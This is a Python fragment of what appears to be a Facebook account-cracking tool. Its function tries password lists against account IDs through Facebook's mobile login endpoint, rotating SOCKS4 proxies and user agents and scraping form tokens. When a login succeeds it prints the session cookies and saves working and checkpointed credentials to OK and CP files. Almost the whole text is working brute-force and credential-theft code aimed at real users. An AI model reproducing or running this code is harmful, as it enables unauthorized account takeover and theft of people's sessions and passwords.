                       
def ____crack____ngentott_________(idf,____sllowly_____pw____,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}Running{P}|{P}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice
	ua = rc(ugen)
	ses = requests.Session()
	for pw in ____sllowly_____pw____:
		try: 
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=140235673279940&kid_directed_site=0&app_id=140235673279940&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D140235673279940%26auth_type%26cbt%3D1704088960393%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1bb72145b1f%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener%26client_id%3D140235673279940%26config_id%26display%3Dtouch%26domain%3Dmy.freenom.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmy.freenom.com%252Fclientarea.php%26force_confirmation%3Dfalse%26id%3Df379798f8b6896%26locale%3Den_US%26logger_id%3Db4cc7aa7-274b-4da7-8c07-d2550065a43a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df345bdf985ded9%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener.parent%2526frame%253Df379798f8b6896%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df345bdf985ded9%26domain%3Dmy.freenom.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmy.freenom.com%252Ff3d9804737545e%26relation%3Dopener.parent%26frame%3Df379798f8b6896%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=140235673279940&kid_directed_site=0&app_id=140235673279940&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D140235673279940%26auth_type%26cbt%3D1704088960393%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1bb72145b1f%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener%26client_id%3D140235673279940%26config_id%26display%3Dtouch%26domain%3Dmy.freenom.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmy.freenom.com%252Fclientarea.php%26force_confirmation%3Dfalse%26id%3Df379798f8b6896%26locale%3Den_US%26logger_id%3Db4cc7aa7-274b-4da7-8c07-d2550065a43a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df345bdf985ded9%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener.parent%2526frame%253Df379798f8b6896%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df345bdf985ded9%26domain%3Dmy.freenom.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmy.freenom.com%252Ff3d9804737545e%26relation%3Dopener.parent%26frame%3Df379798f8b6896%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=140235673279940&auth_token=ad2a811231a8875e972d3b31c3cf6735&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D140235673279940%26auth_type%26cbt%3D1704088960393%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1bb72145b1f%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener%26client_id%3D140235673279940%26config_id%26display%3Dtouch%26domain%3Dmy.freenom.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmy.freenom.com%252Fclientarea.php%26force_confirmation%3Dfalse%26id%3Df379798f8b6896%26locale%3Den_US%26logger_id%3Db4cc7aa7-274b-4da7-8c07-d2550065a43a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df345bdf985ded9%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener.parent%2526frame%253Df379798f8b6896%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=140235673279940&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df345bdf985ded9%26domain%3Dmy.freenom.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmy.freenom.com%252Ff3d9804737545e%26relation%3Dopener.parent%26frame%3Df379798f8b6896%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():  
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}[XYNARAA-OK] {H}{idf}|{pw}|{kuki}')
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[XYNARAA-CP] {M}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	

            #_____________________CONTROL SYSTEM___________________#
            
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	_______login____dulu____lahhh___()
	
